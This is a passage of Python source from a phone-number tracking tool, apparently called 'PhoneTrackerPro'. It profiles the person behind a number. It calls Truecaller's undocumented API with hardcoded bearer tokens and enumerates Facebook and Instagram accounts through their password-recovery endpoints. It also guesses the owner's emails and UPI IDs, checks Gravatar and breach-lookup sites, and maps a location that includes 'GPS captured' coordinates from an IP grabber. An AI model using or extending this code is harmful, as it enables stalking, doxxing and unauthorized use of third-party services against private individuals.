        console.print(f"[cyan]  Geocoding target: {target_city}[/cyan]")
        if not self.latitude:
            self._geo_opencage(target_city)
        if not self.latitude:
            self._geo_nominatim(target_city)
        # Populate geo_results dict
        self.geo_results = {
            "latitude": self.latitude,
            "longitude": self.longitude,
            "city": self.city,
            "state": self.state,
            "formatted_address": self.formatted_address,
            "timezone": self.timezone,
        }

    def _geo_opencage(self, city):
        api_key = os.getenv("OPENCAGE_API_KEY", "")
        if not api_key:
            console.print("[dim]  OPENCAGE_API_KEY not set.[/dim]")
            return False
        try:
            session = self._get_session()
            country = self.country or "India"
            circle_name = self.telecom_circle.get("circle", "") if isinstance(self.telecom_circle, dict) else str(self.telecom_circle)
            query = f"{city}, {circle_name}, {country}".strip(", ")
            url = f"https://api.opencagedata.com/geocode/v1/json?q={requests.utils.quote(query)}&key={api_key}&limit=1&no_annotations=0"
            resp = session.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                results = data.get("results", [])
                if results:
                    r = results[0]
                    geo = r.get("geometry", {})
                    self.latitude = geo.get("lat")
                    self.longitude = geo.get("lng")
                    comp = r.get("components", {})
                    self.city = comp.get("city", comp.get("town", comp.get("village", city)))
                    self.state = comp.get("state", circle_name)
                    self.formatted_address = r.get("formatted", "")
                    ann = r.get("annotations", {})
                    tz = ann.get("timezone", {})
                    self.timezone = tz.get("name", "")
                    console.print(f"[green]  ✓ OpenCage: {self.latitude}, {self.longitude}[/green]")
                    console.print(f"[green]    {self.formatted_address}[/green]")
                    return True
        except Exception as e:
            console.print(f"[dim]  OpenCage error: {e}[/dim]")
        return False

    def _geo_nominatim(self, city):
        try:
            session = self._get_session()
            session.headers["User-Agent"] = "PhoneTrackerPro/4.0 (security research)"
            country = self.country or "India"
            circle_name = self.telecom_circle.get("circle", "") if isinstance(self.telecom_circle, dict) else str(self.telecom_circle)
            query = f"{city}, {circle_name}, {country}".strip(", ")
            url = f"https://nominatim.openstreetmap.org/search?q={requests.utils.quote(query)}&format=json&limit=1&addressdetails=1"
            resp = session.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data:
                    r = data[0]
                    self.latitude = float(r.get("lat", 0))
                    self.longitude = float(r.get("lon", 0))
                    addr = r.get("address", {})
                    self.city = addr.get("city", addr.get("town", addr.get("village", city)))
                    self.state = addr.get("state", circle_name)
                    self.formatted_address = r.get("display_name", "")
                    console.print(f"[green]  ✓ Nominatim: {self.latitude}, {self.longitude}[/green]")
                    return True
        except Exception as e:
            console.print(f"[dim]  Nominatim error: {e}[/dim]")
        return False

    def display_geolocation(self):
        if not self.latitude:
            console.print("[yellow]  No coordinates found.[/yellow]")
            return
        table = Table(title="🌍 GEOLOCATION DATA", border_style="green", show_lines=True)
        table.add_column("Field", style="bold white", width=25)
        table.add_column("Value", style="green", width=50)
        table.add_row("City", str(self.city))
        table.add_row("State/Region", str(self.state))
        table.add_row("Country", str(self.country))
        table.add_row("Latitude", str(self.latitude))
        table.add_row("Longitude", str(self.longitude))
        if self.formatted_address:
            table.add_row("Full Address", self.formatted_address)
        if self.timezone:
            table.add_row("Timezone", self.timezone)
        if self.telecom_circle:
            circle_str = self.telecom_circle.get("circle", "") if isinstance(self.telecom_circle, dict) else str(self.telecom_circle)
            if circle_str:
                table.add_row("Telecom Circle", circle_str)
        if self.sim_registration_city:
            table.add_row("SIM Registration", f"[yellow]{self.sim_registration_city}[/yellow]")
        if self.live_location.get("city") and self.live_location["city"] != self.sim_registration_city:
            table.add_row("Live Location", f"[bold green]{self.live_location['city']}[/bold green]")
        console.print(table)

    # =====================================================================
    # PART 5: OSINT — Platform Probes
    # =====================================================================
    def run_osint(self):
        console.print(Panel("[bold cyan]PHASE 5: OSINT — PLATFORM INTELLIGENCE[/bold cyan]", border_style="cyan"))
        probes = [
            ("WhatsApp", self._probe_whatsapp),
            ("Telegram", self._probe_telegram),
            ("Truecaller", self._probe_truecaller_web),
            ("Eyecon", self._probe_eyecon),
            ("SyncMe", self._probe_syncme),
            ("Facebook", self._probe_facebook),
            ("Instagram", self._probe_instagram),
            ("Google", self._probe_google),
            ("AbstractAPI Phone", self._probe_abstractapi_email),
        ]
        if self.country_code == "+91":
            probes.append(("India UPI", self._check_india_upi))
        # Run all platform probes first
        for name, func in probes:
            try:
                with console.status(f"[cyan]  Probing {name}...[/cyan]"):
                    func()
                    time.sleep(random.uniform(0.5, 1.5))
            except Exception as e:
                console.print(f"[dim]  {name} error: {e}[/dim]")
        # Now generate email guesses (needs owner_name from probes above)
        try:
            with console.status("[cyan]  Generating email guesses...[/cyan]"):
                self._probe_email_from_name()
        except Exception as e:
            console.print(f"[dim]  Email guess error: {e}[/dim]")
        # Check Gravatar with generated emails
        try:
            with console.status("[cyan]  Checking Gravatar profiles...[/cyan]"):
                self._probe_gravatar()
                time.sleep(0.5)
        except Exception as e:
            console.print(f"[dim]  Gravatar error: {e}[/dim]")
        self.display_osint()

    def _probe_whatsapp(self):
        try:
            session = self._get_session()
            full = self.phone_number.replace("+", "").replace(" ", "")
            url = f"https://api.whatsapp.com/send?phone={full}"
            resp = session.get(url, timeout=8, allow_redirects=False)
            if resp.status_code in [200, 301, 302]:
                self.osint_results["whatsapp"] = {"registered": True, "url": f"https://wa.me/{full}", "status": "Likely registered"}
                console.print("[green]  ✓ WhatsApp: Likely registered[/green]")
            else:
                self.osint_results["whatsapp"] = {"registered": False, "status": "Not found"}
                console.print("[dim]  WhatsApp: Not detected[/dim]")
        except Exception:
            self.osint_results["whatsapp"] = {"registered": "Unknown"}

    def _probe_telegram(self):
        try:
            session = self._get_session()
            full = self.phone_number.replace("+", "").replace(" ", "")
            url = f"https://t.me/+{full}"
            resp = session.get(url, timeout=8)
            if resp.status_code == 200 and "tgme_page" in resp.text:
                self.osint_results["telegram"] = {"registered": True, "status": "Profile found"}
                console.print("[green]  ✓ Telegram: Profile detected[/green]")
            else:
                self.osint_results["telegram"] = {"registered": False, "status": "Not found"}
                console.print("[dim]  Telegram: Not detected[/dim]")
        except Exception:
            self.osint_results["telegram"] = {"registered": "Unknown"}

    def _probe_truecaller_web(self):
        """Multi-method Truecaller lookup: API endpoints + web scraping."""
        full = self.phone_number.replace(" ", "")
        e164 = full  # e.g. +919469593244
        nat = self.national_number.replace(" ", "")
        cc = self.country_code.replace("+", "")
        session = self._get_session()
        name = ""
        email = ""
        found = False

        # Method 1: Truecaller undocumented search API (used by browser)
        try:
            api_url = f"https://search5-noneu.truecaller.com/v2/search?q={e164}&countryCode={cc}&type=4&locAddr=&placement=SEARCHPAGE&encoding=json"
            headers = {
                "User-Agent": "Truecaller/13.15.6 (Android; 13)",
                "Accept": "application/json",
            }
            # Try with a known installation ID pattern
            install_ids = [
                "a]i5O6mGBmaza_eLLReAXf4kMx8hQxM1POyVaTlKZO4oEYzH=",
                "a1i0O+6maBGmBaza_eLrLZReXAf4kXMx8hQxM1xPOOyVTaTlKZZO4oEYzH=",
            ]
            for iid in install_ids:
                try:
                    h = {**headers, "Authorization": f"Bearer {iid}"}
                    resp = session.get(api_url, headers=h, timeout=8)
                    if resp.status_code == 200:
                        data = resp.json()
                        if "data" in data:
                            entries = data["data"]
                            if isinstance(entries, list) and entries:
                                entry = entries[0]
                                name = entry.get("name", "")
                                if isinstance(name, dict):
                                    first = name.get("first", "")
                                    last = name.get("last", "")
                                    name = f"{first} {last}".strip()
                                email = entry.get("internetAddresses", [{}])
                                if isinstance(email, list) and email:
                                    email = email[0].get("id", "")
                                else:
                                    email = ""
                                found = True
                                break
                except Exception:
                    continue
        except Exception:
            pass

        # Method 2: Truecaller web search page (scrape)
        if not found:
            try:
                country_map = {"91": "in", "1": "us", "44": "gb", "971": "ae", "966": "sa", "61": "au"}
                country_code_web = country_map.get(cc, "in")
                url = f"https://www.truecaller.com/search/{country_code_web}/{nat}"
                session.headers["User-Agent"] = random.choice(USER_AGENTS)
                resp = session.get(url, timeout=10, allow_redirects=True)
                if resp.status_code == 200:
                    soup = BeautifulSoup(resp.text, 'lxml')
                    # Try Next.js __NEXT_DATA__ JSON (Truecaller uses Next.js)
                    script_tag = soup.find("script", {"id": "__NEXT_DATA__"})
                    if script_tag:
                        try:
                            next_data = json.loads(script_tag.string)
                            props = next_data.get("props", {}).get("pageProps", {})
                            profile = props.get("data", {}) or props.get("result", {})
                            if isinstance(profile, dict):
                                n = profile.get("name", {})
                                if isinstance(n, dict):
                                    name = f"{n.get('first', '')} {n.get('last', '')}".strip()
                                elif isinstance(n, str):
                                    name = n
                                addrs = profile.get("internetAddresses", [])
                                if addrs and isinstance(addrs, list):
                                    email = addrs[0].get("id", "")
                                if name:
                                    found = True
                        except (json.JSONDecodeError, AttributeError):
                            pass
                    # Fallback: scrape visible HTML
                    if not found:
                        name_el = soup.find("h1") or soup.find(class_="profile-name") or soup.find("span", class_=re.compile(r"OwnerName|caller-name", re.I))
                        if name_el:
                            n = name_el.get_text(strip=True)
                            if n and len(n) > 1 and "truecaller" not in n.lower() and "search" not in n.lower():
                                name = n
                                found = True
                        # Try to find email on the page
                        email_pattern = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
                        page_text = soup.get_text()
                        email_matches = email_pattern.findall(page_text)
                        # Filter out Truecaller's own emails
                        email_matches = [e for e in email_matches if "truecaller" not in e.lower() and "example" not in e.lower()]
                        if email_matches and not email:
                            email = email_matches[0]
            except Exception:
                pass

        # Method 3: Alternative caller ID APIs
        if not found:
            alt_apis = [
                f"https://api.callapp.com/v1/search?phone={e164}",
                f"https://calleridservice.com/api/lookup?number={e164}",
            ]
            for api_url in alt_apis:
                try:
                    resp = session.get(api_url, timeout=6, headers={"User-Agent": random.choice(USER_AGENTS)})
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            n = data.get("name", data.get("displayName", data.get("caller_name", "")))
                            if n and isinstance(n, str) and len(n) > 1:
                                name = n
                                found = True
                                email = data.get("email", data.get("emailAddress", ""))
                                break
                        except:
                            pass
                except:
                    pass

        # Store results
        if found and name:
            result = {"name": name, "found": True}
            if email:
                result["email"] = email
                self.osint_results["truecaller_email"] = email
                self.osint_data["possible_emails"].insert(0, email) if email not in self.osint_data.get("possible_emails", []) else None
            if not self.owner_name or self.owner_name in ["", "Unknown"]:
                self.owner_name = name
            self.osint_results["truecaller"] = result
            console.print(f"[bold green]  ✓ Truecaller: {name}[/bold green]")
            if email:
                console.print(f"[bold green]  ✓ Truecaller Email: {email}[/bold green]")
        else:
            self.osint_results["truecaller"] = {"found": False}
            console.print("[dim]  Truecaller: No public data (try Truecaller app for manual lookup)[/dim]")

    def _probe_eyecon(self):
        try:
            session = self._get_session()
            full = self.phone_number.replace(" ", "")
            url = f"https://www.eyecon.com/search/{full}"
            resp = session.get(url, timeout=8)
            if resp.status_code == 200 and "profile" in resp.text.lower():
                self.osint_results["eyecon"] = {"found": True, "status": "Profile exists"}
                console.print("[green]  ✓ Eyecon: Profile detected[/green]")
            else:
                self.osint_results["eyecon"] = {"found": False}
                console.print("[dim]  Eyecon: Not found[/dim]")
        except Exception:
            self.osint_results["eyecon"] = {"found": False}

    def _probe_syncme(self):
        try:
            session = self._get_session()
            cc = self.country_code.replace("+", "")
            nat = self.national_number.replace(" ", "")
            url = f"https://sync.me/search/?number={cc}{nat}"
            resp = session.get(url, timeout=8)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'lxml')
                name_el = soup.find(class_="name") or soup.find("h2")
                if name_el:
                    name = name_el.get_text(strip=True)
                    if name and len(name) > 1:
                        self.osint_results["syncme"] = {"name": name, "found": True}
                        if not self.owner_name:
                            self.owner_name = name
                        console.print(f"[green]  ✓ SyncMe: {name}[/green]")
                        return
            self.osint_results["syncme"] = {"found": False}
            console.print("[dim]  SyncMe: Not found[/dim]")
        except Exception:
            self.osint_results["syncme"] = {"found": False}

    def _probe_facebook(self):
        try:
            session = self._get_session()
            full = self.phone_number.replace("+", "").replace(" ", "")
            url = f"https://www.facebook.com/login/identify/?ctx=recover&lwv=110&phone={full}"
            resp = session.get(url, timeout=8, allow_redirects=False)
            if resp.status_code in [200, 302]:
                self.osint_results["facebook"] = {"found": True, "status": "Account may exist"}
                console.print("[green]  ✓ Facebook: Account indicator found[/green]")
            else:
                self.osint_results["facebook"] = {"found": False}
                console.print("[dim]  Facebook: No indicator[/dim]")
        except Exception:
            self.osint_results["facebook"] = {"found": False}

    def _probe_instagram(self):
        try:
            session = self._get_session()
            session.headers["X-Requested-With"] = "XMLHttpRequest"
            full = self.phone_number.replace(" ", "")
            url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
            resp = session.post(url, data={"email_or_username": full}, timeout=8)
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get("status") == "ok":
                        self.osint_results["instagram"] = {"found": True, "status": "Account exists"}
                        console.print("[green]  ✓ Instagram: Account exists[/green]")
                        return
                except:
                    pass
            self.osint_results["instagram"] = {"found": False}
            console.print("[dim]  Instagram: Not found[/dim]")
        except Exception:
            self.osint_results["instagram"] = {"found": False}

    def _probe_google(self):
        try:
            session = self._get_session()
            full = self.phone_number.replace(" ", "")
            nat = self.national_number.replace(" ", "")
            query = f'"{full}" OR "{nat}"'
            url = f"https://www.google.com/search?q={requests.utils.quote(query)}&num=10"
            session.headers["User-Agent"] = random.choice(USER_AGENTS)
            resp = session.get(url, timeout=10)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'lxml')
                results = soup.find_all("div", class_="g")
                mentions = []
                for r in results[:5]:
                    title = r.find("h3")
                    link = r.find("a")
                    if title and link:
                        mentions.append({"title": title.get_text(strip=True), "url": link.get("href", "")})
                if mentions:
                    self.osint_results["google_mentions"] = mentions
                    console.print(f"[green]  ✓ Google: {len(mentions)} mentions found[/green]")
                else:
                    self.osint_results["google_mentions"] = []
                    console.print("[dim]  Google: No public mentions[/dim]")
        except Exception:
            self.osint_results["google_mentions"] = []

    def _check_india_upi(self):
        if self.country_code != "+91":
            return
        nat = self.national_number.replace(" ", "")
        upi_providers = ["@paytm", "@ybl", "@okaxis", "@oksbi", "@okhdfcbank",
                         "@upi", "@axl", "@ibl", "@apl", "@pingpay"]
        possible_upis = [f"{nat}{suffix}" for suffix in upi_providers]
        self.osint_results["upi_possible"] = possible_upis
        console.print(f"[green]  ✓ UPI: {len(possible_upis)} possible IDs generated[/green]")
        for upi in possible_upis[:3]:
            console.print(f"[dim]    → {upi}[/dim]")

    def _probe_email_from_name(self):
        """Generate possible email addresses from owner name + phone number."""
        nat = self.national_number.replace(" ", "")
        emails = []

        # Always add phone-based emails
        common_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "rediffmail.com"]
        for domain in common_domains:
            emails.append(f"{nat}@{domain}")

        # If we have owner name, generate name-based emails
        if self.owner_name and len(self.owner_name) > 2:
            name = self.owner_name.strip()
            # Skip if it's a generic/junk name
            skip_words = ["truecaller", "spam", "unknown", "calling", "know", "always", "sync"]
            if not any(sw in name.lower() for sw in skip_words):
                parts = re.sub(r'[^a-zA-Z\s]', '', name).lower().split()
                parts = [p for p in parts if len(p) > 1]
                if len(parts) >= 2:
                    first, last = parts[0], parts[-1]
                    for domain in ["gmail.com", "yahoo.com", "outlook.com"]:
                        emails.append(f"{first}.{last}@{domain}")
                        emails.append(f"{first}{last}@{domain}")
                        emails.append(f"{first}{last[0]}@{domain}")
                        emails.append(f"{first[0]}{last}@{domain}")
                        emails.append(f"{first}.{last}{nat[-4:]}@{domain}")
                elif len(parts) == 1:
                    n = parts[0]
                    for domain in ["gmail.com", "yahoo.com", "outlook.com"]:
                        emails.append(f"{n}@{domain}")
                        emails.append(f"{n}{nat[-4:]}@{domain}")
                        emails.append(f"{n}{nat[-6:]}@{domain}")

        # Deduplicate
        seen = set()
        unique_emails = []
        for e in emails:
            if e not in seen:
                seen.add(e)
                unique_emails.append(e)

        self.osint_results["possible_emails"] = unique_emails
        self.osint_data["possible_emails"] = unique_emails
        if unique_emails:
            console.print(f"[green]  ✓ Email Guess: {len(unique_emails)} possible emails generated[/green]")
            for em in unique_emails[:4]:
                console.print(f"[dim]    → {em}[/dim]")

    def _probe_gravatar(self):
        """Check Gravatar for profile photo/name using email hashes."""
        emails_to_check = self.osint_results.get("possible_emails", [])
        if not emails_to_check:
            nat = self.national_number.replace(" ", "")
            emails_to_check = [f"{nat}@gmail.com", f"{nat}@yahoo.com"]
        found_profiles = []
        session = self._get_session()
        for email in emails_to_check[:8]:
            try:
                email_hash = hashlib.md5(email.strip().lower().encode()).hexdigest()
                url = f"https://www.gravatar.com/{email_hash}.json"
                resp = session.get(url, timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    entries = data.get("entry", [])
                    for entry in entries:
                        profile = {
                            "email": email,
                            "display_name": entry.get("displayName", ""),
                            "profile_url": entry.get("profileUrl", ""),
                            "photo": entry.get("thumbnailUrl", ""),
                            "about": entry.get("aboutMe", ""),
                        }
                        if profile["display_name"]:
                            if not self.owner_name or self.owner_name in ["Unknown", ""]:
                                self.owner_name = profile["display_name"]
                            console.print(f"[bold green]  ✓ Gravatar: Name = {profile['display_name']} ({email})[/bold green]")
                        found_profiles.append(profile)
            except:
                pass
        self.osint_results["gravatar"] = found_profiles
        if not found_profiles:
            console.print("[dim]  Gravatar: No profiles found[/dim]")

    def _probe_abstractapi_email(self):
        """Use AbstractAPI Phone Validation to try to get name/carrier data."""
        api_key = os.getenv("ABSTRACT_API_KEY", "")
        if not api_key:
            return
        try:
            session = self._get_session()
            full = self.phone_number.replace("+", "").replace(" ", "")
            url = f"https://phonevalidation.abstractapi.com/v1/?api_key={api_key}&phone={full}"
            resp = session.get(url, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                # AbstractAPI sometimes returns format/carrier info
                ab_carrier = data.get("carrier", "")
                ab_type = data.get("type", "")
                ab_location = data.get("location", "")
                ab_country = data.get("country", {})
                result = {
                    "carrier": ab_carrier,
                    "type": ab_type,
                    "location": ab_location,
                    "country_name": ab_country.get("name", "") if isinstance(ab_country, dict) else str(ab_country),
                    "valid": data.get("valid", False),
                }
                self.osint_results["abstractapi_phone"] = result
                if ab_location:
                    console.print(f"[green]  ✓ AbstractAPI: {ab_location} | {ab_carrier} | {ab_type}[/green]")
                else:
                    console.print(f"[dim]  AbstractAPI: Validated, no extra location[/dim]")
        except Exception:
            pass

    def display_osint(self):
        if not self.osint_results:
            console.print("[yellow]  No OSINT data collected.[/yellow]")
            return
        table = Table(title="🔍 OSINT INTELLIGENCE", border_style="magenta", show_lines=True)
        table.add_column("Platform", style="bold white", width=20)
        table.add_column("Status", style="white", width=15)
        table.add_column("Details", style="cyan", width=40)
        for platform, data in self.osint_results.items():
            if platform == "truecaller_email":
                continue  # Shown separately below
            elif platform == "google_mentions":
                count = len(data) if isinstance(data, list) else 0
                table.add_row("Google", f"[green]{count} hits[/green]" if count else "[dim]None[/dim]",
                            ", ".join([m.get("title", "")[:30] for m in data[:2]]) if data else "")
            elif platform == "upi_possible":
                table.add_row("UPI IDs", f"[green]{len(data)}[/green]", ", ".join(data[:2]) + "...")
            elif platform == "possible_emails":
                table.add_row("[bold]Email Guesses[/bold]", f"[green]{len(data)}[/green]",
                            "\n".join(data[:4]) + ("\n..." if len(data) > 4 else ""))
            elif platform == "gravatar":
                if data:
                    names = [p.get("display_name", "") for p in data if p.get("display_name")]
                    table.add_row("[bold]Gravatar[/bold]", f"[bold green]{len(data)} profile(s)[/bold green]",
                                ", ".join(names) if names else "Profile found")
                else:
                    table.add_row("Gravatar", "[dim]None[/dim]", "")
            elif platform == "abstractapi_phone":
                if isinstance(data, dict) and data.get("valid"):
                    detail = f"{data.get('location', '')} | {data.get('carrier', '')}"
                    table.add_row("AbstractAPI", "[green]Valid[/green]", detail.strip(" |"))
            elif isinstance(data, dict):
                found = data.get("found", data.get("registered", False))
                status = "[green]Found[/green]" if found else "[dim]Not found[/dim]"
                name = data.get("name", data.get("status", ""))
                # Show Truecaller email inline if present
                extra = ""
                if platform == "truecaller" and data.get("email"):
                    extra = f" | ✉ {data['email']}"
                table.add_row(platform.title(), status, (str(name)[:40] + extra) if extra else str(name)[:40])
        # Owner name row
        if self.owner_name:
            table.add_row("[bold]OWNER NAME[/bold]", "[bold green]FOUND[/bold green]",
                        f"[bold green]{self.owner_name}[/bold green]")
        # Truecaller email row (highlighted)
        tc_email = self.osint_results.get("truecaller_email", "")
        if tc_email:
            table.add_row("[bold]OWNER EMAIL[/bold]", "[bold green]FOUND[/bold green]",
                        f"[bold green]{tc_email}[/bold green]")
        console.print(table)

    # =====================================================================
    # PART 6: DEEP OSINT — Spam, Breach, Web
    # =====================================================================
    def run_deep_osint(self):
        console.print(Panel("[bold cyan]PHASE 6: DEEP OSINT — ADVANCED RECON[/bold cyan]", border_style="cyan"))
        deep_probes = [
            ("Spam Databases", self._scrape_spamcalls),
            ("ShouldIAnswer", self._scrape_shouldianswer),
            ("Breach Check", self._check_haveibeenpwned_style),
            ("Web Mentions", self._web_search_mentions),
        ]
        for name, func in deep_probes:
            try:
                with console.status(f"[cyan]  Deep scan: {name}...[/cyan]"):
                    func()
                    time.sleep(random.uniform(0.5, 1.5))
            except Exception as e:
                console.print(f"[dim]  {name} error: {e}[/dim]")

    def _scrape_spamcalls(self):
        try:
            session = self._get_session()
            nat = self.national_number.replace(" ", "")
            urls = [
                f"https://www.spamcalls.net/en/number/{self.country_code.replace('+','')}{nat}",
                f"https://www.callfilter.app/search/{self.country_code.replace('+','')}{nat}",
            ]
            spam_reports = []
            for url in urls:
                try:
                    resp = session.get(url, timeout=8)
                    if resp.status_code == 200:
                        soup = BeautifulSoup(resp.text, 'lxml')
                        text = soup.get_text().lower()
                        if any(word in text for word in ["spam", "scam", "fraud", "telemarketer", "robocall"]):
                            spam_reports.append({"source": url.split("//")[1].split("/")[0], "flagged": True})
                except:
                    pass
            if spam_reports:
                self.deep_osint["spam_reports"] = spam_reports
                console.print(f"[yellow]  ⚠ Spam: Flagged on {len(spam_reports)} database(s)[/yellow]")
            else:
                self.deep_osint["spam_reports"] = []
                console.print("[green]  ✓ Spam: Clean — no spam reports found[/green]")
        except Exception:
            pass

    def _scrape_shouldianswer(self):
        try:
            session = self._get_session()
            full = self.phone_number.replace("+", "").replace(" ", "")
            url = f"https://www.shouldianswer.com/phone-number/{full}"
            resp = session.get(url, timeout=8)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, 'lxml')
                rating = soup.find(class_="rating") or soup.find(class_="score")
                reviews = soup.find_all(class_="review") or soup.find_all(class_="comment")
                result = {
                    "found": True,
                    "rating": rating.get_text(strip=True) if rating else "N/A",
                    "review_count": len(reviews),
                }
                self.deep_osint["shouldianswer"] = result
                console.print(f"[green]  ✓ ShouldIAnswer: {result['review_count']} reviews[/green]")
            else:
                self.deep_osint["shouldianswer"] = {"found": False}
                console.print("[dim]  ShouldIAnswer: No data[/dim]")
        except Exception:
            self.deep_osint["shouldianswer"] = {"found": False}

    def _check_haveibeenpwned_style(self):
        try:
            session = self._get_session()
            full = self.phone_number.replace(" ", "")
            nat = self.national_number.replace(" ", "")
            search_urls = [
                f"https://leak-lookup.com/search?query={full}",
                f"https://intelx.io/?s={full}",
            ]
            results = []
            for url in search_urls:
                try:
                    resp = session.get(url, timeout=8)
                    if resp.status_code == 200:
                        text = resp.text.lower()
                        if any(w in text for w in ["found", "result", "leak", "breach", "exposed"]):
                            results.append(url.split("//")[1].split("/")[0])
                except:
                    pass
            if results:
                self.deep_osint["breach_indicators"] = results
                console.print(f"[red]  ⚠ Breach: Indicators on {len(results)} source(s)[/red]")
            else:
                self.deep_osint["breach_indicators"] = []
                console.print("[green]  ✓ Breach: No indicators found[/green]")
        except Exception:
            pass

    def _web_search_mentions(self):
        try:
            session = self._get_session()
            full = self.phone_number.replace(" ", "")
            nat = self.national_number.replace(" ", "")
            queries = [
                f'"{full}" site:linkedin.com OR site:twitter.com',
                f'"{nat}" resume OR CV OR contact',
            ]
            all_mentions = []
            for query in queries:
                try:
                    url = f"https://www.google.com/search?q={requests.utils.quote(query)}&num=5"
                    session.headers["User-Agent"] = random.choice(USER_AGENTS)
                    resp = session.get(url, timeout=10)
                    if resp.status_code == 200:
                        soup = BeautifulSoup(resp.text, 'lxml')
                        for r in soup.find_all("div", class_="g")[:3]:
                            title = r.find("h3")
                            link = r.find("a")
                            if title and link:
                                all_mentions.append({
                                    "title": title.get_text(strip=True),
                                    "url": link.get("href", ""),
                                })
                                city_guess = self._guess_city_from_text(title.get_text() + " " + link.get("href", ""))
                                if city_guess:
                                    self._add_vote(city_guess, "WebMention", 0.2)
                    time.sleep(random.uniform(1, 2))
                except:
                    pass
            self.deep_osint["web_mentions"] = all_mentions
            if all_mentions:
                console.print(f"[green]  ✓ Web: {len(all_mentions)} mention(s) found[/green]")
                for m in all_mentions[:2]:
                    console.print(f"[dim]    → {m['title'][:50]}[/dim]")
            else:
                console.print("[dim]  Web: No mentions found[/dim]")
        except Exception:
            pass

    def _guess_city_from_text(self, text):
        indian_cities = [
            "Delhi", "Mumbai", "Bangalore", "Bengaluru", "Chennai", "Kolkata",
            "Hyderabad", "Pune", "Ahmedabad", "Jaipur", "Lucknow", "Chandigarh",
            "Bhopal", "Indore", "Patna", "Noida", "Gurgaon", "Gurugram",
            "Ghaziabad", "Faridabad", "Surat", "Nagpur", "Thane", "Visakhapatnam",
            "Kanpur", "Varanasi", "Ludhiana", "Amritsar", "Coimbatore", "Madurai",
            "Kochi", "Thiruvananthapuram", "Ranchi", "Bhubaneswar", "Dehradun",
            "Shimla", "Srinagar", "Jammu", "Guwahati", "Agra", "Meerut",
        ]
        text_lower = text.lower()
        for city in indian_cities:
            if city.lower() in text_lower:
                return city
        return None

    # =====================================================================
    # PART 7: MAP + REPORTS
    # =====================================================================
    def generate_map(self):
        if not self.geo_results.get("latitude"):
            console.print("[yellow]  No coordinates available for map.[/yellow]")
            return None
        try:
            import folium
            lat = self.geo_results["latitude"]
            lon = self.geo_results["longitude"]
            m = folium.Map(location=[lat, lon], zoom_start=12, tiles="OpenStreetMap")
            popup_html = f"""
            <div style='font-family:Arial;min-width:200px'>
                <h3 style='color:#e74c3c'>📱 {self.phone_number}</h3>
                <b>SIM Location:</b> {self.basic_info.get('location','N/A')}<br>
                <b>Live Location:</b> {self.live_location.get('city','N/A')}<br>
                <b>Carrier:</b> {self.basic_info.get('carrier','N/A')}<br>
                <b>Owner:</b> {self.owner_name or 'Unknown'}<br>
                <b>Coordinates:</b> {lat:.4f}, {lon:.4f}
            </div>
            """
            folium.Marker(
                [lat, lon], popup=folium.Popup(popup_html, max_width=300),
                tooltip=f"{self.phone_number}",
                icon=folium.Icon(color="red", icon="phone", prefix="fa")
            ).add_to(m)
            folium.Circle(
                [lat, lon], radius=5000, color='red', fill=True,
                fillColor='red', fillOpacity=0.1, popup="Approx. Area"
            ).add_to(m)
            if self.ip_grab_results.get("gps_lat"):
                gps_lat = self.ip_grab_results["gps_lat"]
                gps_lon = self.ip_grab_results["gps_lon"]
                gps_popup = f"""
                <div style='font-family:Arial;min-width:200px'>
                    <h3 style='color:#2ecc71'>📍 GPS Captured Location</h3>
                    <b>Lat:</b> {gps_lat}<br>
                    <b>Lon:</b> {gps_lon}<br>
                    <b>IP:</b> {self.ip_grab_results.get('ip','N/A')}<br>
                    <b>Accuracy:</b> High (GPS)
                </div>
                """
                folium.Marker(
                    [gps_lat, gps_lon], popup=folium.Popup(gps_popup, max_width=300),
                    tooltip="GPS Captured",
                    icon=folium.Icon(color="green", icon="crosshairs", prefix="fa")
                ).add_to(m)
                folium.Circle(
                    [gps_lat, gps_lon], radius=100, color='green', fill=True,
                    fillColor='green', fillOpacity=0.2, popup="GPS Location"
                ).add_to(m)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            num = self.phone_number.replace("+", "").replace(" ", "")
            filename = f"output/phone_map_{num}_{ts}.html"
            os.makedirs("output", exist_ok=True)
            m.save(filename)
            console.print(f"[green]  ✓ Map saved: {filename}[/green]")
            return filename
        except ImportError:
            console.print("[yellow]  folium not installed — skipping map.[/yellow]")
            return None
        except Exception as e:
            console.print(f"[red]  Map error: {e}[/red]")
            return None

    def to_dict(self):
        """Export all intelligence as a forensically structured dict."""
        data = {
            "meta": {
                "tool_version": VERSION,
                "scan_id": self.scan_id,
                "case_id": self.case_id,
                "officer": self.officer,
                "classification": self.classification,
                "timestamp_utc": self.scan_timestamp.isoformat(),
                "timestamp_local": self.scan_timestamp_local.isoformat(),
            },
            "target": {
                "msisdn": self.phone_number,
                "country_code": self.country_code,
                "national_number": self.national_number,
                "international_format": self.international_format,
                "national_format": self.national_format,
                "e164": self.e164_format,
            },
            "subscriber_info": self.basic_info,
            "hlr_vlr": {
                "hlr_status": self.hlr_status,
                "network_status": self.network_status,
                "imsi": self.imsi,
                "imei": self.imei,
                "msc_address": self.msc_address,
                "vlr_address": self.vlr_address,
                "ported": self.ported,
                "roaming_detected": self.roaming_detected,
                "roaming_network": self.roaming_network,
            },
            "telecom_circle": self.telecom_circle,
            "live_location": self.live_location,
            "consensus_city": self.consensus_city,
            "all_votes": self.all_votes,
            "geolocation": self.geo_results,
            "ip_grabber": self.ip_grab_results,
            "osint_results": self.osint_results,
            "deep_osint": self.deep_osint,
            "owner_name": self.owner_name,
            "evidence_chain": self.evidence_chain,
        }
        # Compute integrity hash over entire payload
        payload_str = json.dumps(data, sort_keys=True, default=str)
        data["integrity_sha256"] = _sha256(payload_str)
        return data

    def generate_html_report(self):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        num = self.phone_number.replace("+", "").replace(" ", "")
        filename = f"output/phone_report_{num}_{ts}.html"
        os.makedirs("output", exist_ok=True)
        data = self.to_dict()
